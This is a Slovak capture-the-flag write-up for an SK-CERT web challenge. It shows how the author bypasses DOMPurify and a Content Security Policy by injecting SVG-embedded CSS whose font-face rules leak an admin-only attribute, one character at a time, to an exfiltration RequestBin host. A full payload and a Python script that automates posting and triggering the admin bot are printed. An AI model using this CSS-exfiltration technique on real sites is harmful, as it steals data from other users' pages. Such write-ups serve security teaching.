# Zadanie

EN: We've received another request for a penetration test. The customer claims they have implemented strong measures against client-side attacks.

**The challenge is available at:** [http://exp.cybergame.sk:7020/](http://exp.cybergame.sk:7020/) **The admin bot is available at:** [http://exp.cybergame.sk:7021/](http://exp.cybergame.sk:7021/)

**Note:** The instances have **no internet access**. If needed, please use a RequestBin service running at [http://exp.cybergame.sk:7023](http://exp.cybergame.sk:7023/) for exfiltration. It is reachable at [http://exfiltration:8000](http://exfiltration:8000/) from within the challenge network.

SK: Dostali sme požiadavku na ďalší penetračný test. Zákazník tvrdí, že implementoval silnú ochranu proti client-side útokom.

**Aplikácia je dostupná na**: [http://exp.cybergame.sk:7020/](http://exp.cybergame.sk:7020/) **Admin bot je dostupný na:** [http://exp.cybergame.sk:7021/](http://exp.cybergame.sk:7021/)

**Poznámka:** Inštancie **nemajú prístup na internet**. Ak je to potrebné, na exfiltráciu použite službu RequestBin bežiacu na [http://exp.cybergame.sk:7023](http://exp.cybergame.sk:7023/). Z vnútra siete je dostupná na adrese [http://exfiltration:8000](http://exfiltration:8000/).

**Súbory**

- memeblog_handout.zip

## Riešenie

Stránka aplikácie na porte 7020 je akýsi blog, do ktorého sa môžeme registrovať a prihlásiť a po prihlásení máme možnosť pridať príspevok. Tento však neuzrie svetlo sveta pokým ho neschváli admin. Čo hovoria dostupné zdrojáky?

Po rozbalení archívu a pozornom prezretí zdrojákov vidím, že máme k dispozícii info o tom, kde sa vlajka nachádza, dokonca aj druhá. Flag1 sa nachádza v `src/includes/header.php`

```php
<?php if ($auth->isLoggedIn() && $auth->isAdmin()): ?>
    <span class="admin-message" flag1="SK-CERT{flag1_for_testing}">Hello, Admin! (˶˃ ᵕ ˂˶)</span>
<?php endif; ?>
```

Vlajka je súčasťou hlavičky stranky, ale vidí ju, resp. má ju v renderovanom zdrojáku len admin.

V zadaní však máme aj admin-bot stránku, čo je vlastne stránka, do ktorej vložíme preview url nášho príspevku, do ktorej sme predtým vložili nejaký obsah.

Stránka sa na prvý pohľad zdá nepriestrená, mnoho častí html kódu, ktorý tam vložíme prechádza kontrolou cez DOMpurify, čo defakto okreše html, aby bol sejf. žiadne skripty ani nič podobné, nehrozia. Ak sa nám podarí niečo vložiť, stále nás obmedzuje csp (Content Security Policy), ktoré máme definované nasledovne

```php
<?php
$nonce = base64_encode(random_bytes(8));

$csp = "script-src 'nonce-$nonce' 'sha256-0fQyyBH4tw1haqwijgfZtcoBLBYVWJPwJ4iJjHFUwRY=' 'sha256-I1rbvXqXZmrMValU4SWC65enfArEBy0F8Yc7lJyp2Ms=' 'unsafe-hashes' 'self'; " .
       "style-src 'self' 'unsafe-inline'; " .
       "img-src 'self'; " .
       "base-uri 'self'; " .
       "object-src 'none'; ";

header("Content-Security-Policy: $csp");
?>
```

Vidíme, že request na obrázky sa pošle, resp prejde len pokiaľ je url priamo zo stránky, ktorú voláme, ale čo mi bije do očí je unsafe-inline v style, takže toto by mohla byť cesta, napríklad "custom" fontom.. Smrdlí to CSS exfiltration, tak rovno skúsim, či mi pošle na reqbin odpoveď keď tam vložím čo poznám, že sa nachádza vo vlajke.

```html
<svg>
<style>
@font-face{font-family:'xx';src:url('http://exfiltration:8000/writeup/ping')}.admin-message[flag1^='SK-CERT{']{font-family:'xx'!important}
</style>
</svg>
```

a na reqbin mi pristál request na ping... Teraz ak pošlem toľlko font riadkov, že za známou známou časťou vlajky sa trafíme na nasledujúci znak, tak taký request by nám mal prísť, ktorý bude obsahovať zhodu.. Takto písmenko po písmenku odhalíme celú vlajku..

Do príspevku vložím probe

```html
<svg>
<style>
@font-face{font-family:'chr0';src:url('http://exfiltration:8000/writeup/SK-CERT{0')}.admin-message[flag1^='SK-CERT{0']{font-family:'chr0'!important}
@font-face{font-family:'chr1';src:url('http://exfiltration:8000/writeup/SK-CERT{1')}.admin-message[flag1^='SK-CERT{1']{font-family:'chr1'!important}
@font-face{font-family:'chr2';src:url('http://exfiltration:8000/writeup/SK-CERT{2')}.admin-message[flag1^='SK-CERT{2']{font-family:'chr2'!important}
@font-face{font-family:'chr3';src:url('http://exfiltration:8000/writeup/SK-CERT{3')}.admin-message[flag1^='SK-CERT{3']{font-family:'chr3'!important}
@font-face{font-family:'chr4';src:url('http://exfiltration:8000/writeup/SK-CERT{4')}.admin-message[flag1^='SK-CERT{4']{font-family:'chr4'!important}
@font-face{font-family:'chr5';src:url('http://exfiltration:8000/writeup/SK-CERT{5')}.admin-message[flag1^='SK-CERT{5']{font-family:'chr5'!important}
@font-face{font-family:'chr6';src:url('http://exfiltration:8000/writeup/SK-CERT{6')}.admin-message[flag1^='SK-CERT{6']{font-family:'chr6'!important}
@font-face{font-family:'chr7';src:url('http://exfiltration:8000/writeup/SK-CERT{7')}.admin-message[flag1^='SK-CERT{7']{font-family:'chr7'!important}
@font-face{font-family:'chr8';src:url('http://exfiltration:8000/writeup/SK-CERT{8')}.admin-message[flag1^='SK-CERT{8']{font-family:'chr8'!important}
@font-face{font-family:'chr9';src:url('http://exfiltration:8000/writeup/SK-CERT{9')}.admin-message[flag1^='SK-CERT{9']{font-family:'chr9'!important}
@font-face{font-family:'chra';src:url('http://exfiltration:8000/writeup/SK-CERT{a')}.admin-message[flag1^='SK-CERT{a']{font-family:'chra'!important}
@font-face{font-family:'chrb';src:url('http://exfiltration:8000/writeup/SK-CERT{b')}.admin-message[flag1^='SK-CERT{b']{font-family:'chrb'!important}
@font-face{font-family:'chrc';src:url('http://exfiltration:8000/writeup/SK-CERT{c')}.admin-message[flag1^='SK-CERT{c']{font-family:'chrc'!important}
@font-face{font-family:'chrd';src:url('http://exfiltration:8000/writeup/SK-CERT{d')}.admin-message[flag1^='SK-CERT{d']{font-family:'chrd'!important}
@font-face{font-family:'chre';src:url('http://exfiltration:8000/writeup/SK-CERT{e')}.admin-message[flag1^='SK-CERT{e']{font-family:'chre'!important}
@font-face{font-family:'chrf';src:url('http://exfiltration:8000/writeup/SK-CERT{f')}.admin-message[flag1^='SK-CERT{f']{font-family:'chrf'!important}
@font-face{font-family:'chrg';src:url('http://exfiltration:8000/writeup/SK-CERT{g')}.admin-message[flag1^='SK-CERT{g']{font-family:'chrg'!important}
@font-face{font-family:'chrh';src:url('http://exfiltration:8000/writeup/SK-CERT{h')}.admin-message[flag1^='SK-CERT{h']{font-family:'chrh'!important}
@font-face{font-family:'chri';src:url('http://exfiltration:8000/writeup/SK-CERT{i')}.admin-message[flag1^='SK-CERT{i']{font-family:'chri'!important}
@font-face{font-family:'chrj';src:url('http://exfiltration:8000/writeup/SK-CERT{j')}.admin-message[flag1^='SK-CERT{j']{font-family:'chrj'!important}
@font-face{font-family:'chrk';src:url('http://exfiltration:8000/writeup/SK-CERT{k')}.admin-message[flag1^='SK-CERT{k']{font-family:'chrk'!important}
@font-face{font-family:'chrl';src:url('http://exfiltration:8000/writeup/SK-CERT{l')}.admin-message[flag1^='SK-CERT{l']{font-family:'chrl'!important}
@font-face{font-family:'chrm';src:url('http://exfiltration:8000/writeup/SK-CERT{m')}.admin-message[flag1^='SK-CERT{m']{font-family:'chrm'!important}
@font-face{font-family:'chrn';src:url('http://exfiltration:8000/writeup/SK-CERT{n')}.admin-message[flag1^='SK-CERT{n']{font-family:'chrn'!important}
@font-face{font-family:'chro';src:url('http://exfiltration:8000/writeup/SK-CERT{o')}.admin-message[flag1^='SK-CERT{o']{font-family:'chro'!important}
@font-face{font-family:'chrp';src:url('http://exfiltration:8000/writeup/SK-CERT{p')}.admin-message[flag1^='SK-CERT{p']{font-family:'chrp'!important}
@font-face{font-family:'chrq';src:url('http://exfiltration:8000/writeup/SK-CERT{q')}.admin-message[flag1^='SK-CERT{q']{font-family:'chrq'!important}
@font-face{font-family:'chrr';src:url('http://exfiltration:8000/writeup/SK-CERT{r')}.admin-message[flag1^='SK-CERT{r']{font-family:'chrr'!important}
@font-face{font-family:'chrs';src:url('http://exfiltration:8000/writeup/SK-CERT{s')}.admin-message[flag1^='SK-CERT{s']{font-family:'chrs'!important}
@font-face{font-family:'chrt';src:url('http://exfiltration:8000/writeup/SK-CERT{t')}.admin-message[flag1^='SK-CERT{t']{font-family:'chrt'!important}
@font-face{font-family:'chru';src:url('http://exfiltration:8000/writeup/SK-CERT{u')}.admin-message[flag1^='SK-CERT{u']{font-family:'chru'!important}
@font-face{font-family:'chrv';src:url('http://exfiltration:8000/writeup/SK-CERT{v')}.admin-message[flag1^='SK-CERT{v']{font-family:'chrv'!important}
@font-face{font-family:'chrw';src:url('http://exfiltration:8000/writeup/SK-CERT{w')}.admin-message[flag1^='SK-CERT{w']{font-family:'chrw'!important}
@font-face{font-family:'chrx';src:url('http://exfiltration:8000/writeup/SK-CERT{x')}.admin-message[flag1^='SK-CERT{x']{font-family:'chrx'!important}
@font-face{font-family:'chry';src:url('http://exfiltration:8000/writeup/SK-CERT{y')}.admin-message[flag1^='SK-CERT{y']{font-family:'chry'!important}
@font-face{font-family:'chrz';src:url('http://exfiltration:8000/writeup/SK-CERT{z')}.admin-message[flag1^='SK-CERT{z']{font-family:'chrz'!important}
@font-face{font-family:'chr_';src:url('http://exfiltration:8000/writeup/SK-CERT{_')}.admin-message[flag1^='SK-CERT{_']{font-family:'chr_'!important}
@font-face{font-family:'chr-';src:url('http://exfiltration:8000/writeup/SK-CERT{-')}.admin-message[flag1^='SK-CERT{-']{font-family:'chr-'!important}
@font-face{font-family:'chr}';src:url('http://exfiltration:8000/writeup/SK-CERT{}')}.admin-message[flag1^='SK-CERT{}']{font-family:'chr}'!important}
</style>
</svg>
```

preview url mám `[Meme History Blog](http://exp.cybergame.sk:7020/preview.php?id=639999a2f8f72d1e5fa322b72b9c1980)` admin botovi teda pošlem `[Meme History Blog](http://web/preview.php?id=639999a2f8f72d1e5fa322b72b9c1980)`, pretože ako v zadiní píšu, nie je tam prístup na internet a pozorujem reqbin.

A na reqbine sa mi zjavil request `GET /writeup/SK-CERT{n`, super. máme prvé písmenko vlajky a teraz namiesto `SK-CERT{`  dáme všade `SK-CERT{n` a mal by sa objaviť ďalší znak. Postup opakujeme až kým neobjavíme posledné `}`.

Alebo to zautomatizovať skriptom, ktorý priebežne vypýta písmenko a povytvára nové blogposty, ktoré rovno pošle na schválenie adminovi..

```python
#!/usr/bin/env python3
"""
Auto-leaker (font-face varianta)
• z každého pokusu vygeneruje @font-face pravidlo s URL do tvojho RequestBinu
• font priradí k .admin-message iba vtedy, ak prefix vlajky sedí
• CSP neblokuje sťahovanie fontov → z tvojho hooku vidíš, ktorý prefix zafungoval
"""

import requests, string, sys, time
from urllib.parse import urljoin, quote_plus

# ────────────────  NASTAVENIA  ────────────────
BASE_URL_APP  = "http://exp.cybergame.sk:7020/"
VISIT_URL     = "http://exp.cybergame.sk:7021/visit"
WEBHOOK_ID    = "tvojerqbinid" 
COOKIE_HEADER = "PHPSESSID=xxx;" 

# ───────────────────────────────────────────────

WEBHOOK_FULL  = f"http://exfiltration:8000/{WEBHOOK_ID}"
CHARSET       = string.ascii_lowercase + string.digits + "_-}"
PREFIX        = "SK-CERT{"

sess = requests.Session()
sess.headers.update({
    "User-Agent": "Mozilla/5.0 (font-leaker)",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": COOKIE_HEADER
})

def svg_payload(prefix: str) -> str:
    css_lines = []
    for ch in CHARSET:
        guess      = prefix + ch
        url        = f"{WEBHOOK_FULL}/{guess}"
        css_lines += [
            f"@font-face{{font-family:'{ch}';src:url('{url}')}}",
            f".admin-message[flag1^='{guess}']{{font-family:'{ch}'!important}}\n"
        ]
    return (
        "<svg><style>" + "".join(css_lines) + "</style></svg>"
        "\n"
    )

def new_post(html: str) -> str:
    r = sess.post(urljoin(BASE_URL_APP, "create.php"),
                  data={"title": "font-probe", "content": html},
                  allow_redirects=False)
    if r.status_code != 302 or "Location" not in r.headers:
        raise RuntimeError("create.php failed")
    return urljoin(BASE_URL_APP, r.headers["Location"])

def notify_admin(url: str) -> None:
    r = sess.post(VISIT_URL, data={"url": url})
    if r.status_code != 200:
        raise RuntimeError("/visit failed")

try:
    flag = PREFIX
    while not flag.endswith("}"):
        print(f"\n=== prefix: {flag}")
        payload = svg_payload(flag)
        print(payload)
        post_url = new_post(payload)
        post_url = post_url.replace("http://exp.cybergame.sk:7020/", "http://web/")
        print("  • post:", post_url)
        notify_admin(post_url)
        print("  • počkaj na hit →", f"{WEBHOOK_FULL}/<HIT>")
        ch = input("  • ďalší znak > ").strip()
        if len(ch) != 1:
            print("    ⚠ zadaj 1 znak")
            continue
        flag += ch
        time.sleep(0.4)

    print("\n🎉 FILENAME =", flag)

except (KeyboardInterrupt, EOFError):
    print("\n[ukončené]")
except Exception as e:
    print("✖", e, file=sys.stderr)
    sys.exit(1)
```

A na konci máme 

```
  • post: http://web/preview.php?id=97bdbaa8f090b05d9c108ccbc42c4295
  • počkaj na hit → http://exfiltration:8000/writeup/<HIT>
  • ďalší znak > }

🎉 FLAG = SK-CERT{n0_js_n0_fun_they_s41d}
```

## Vlajka

    SK-CERT{n0_js_n0_fun_they_s41d}
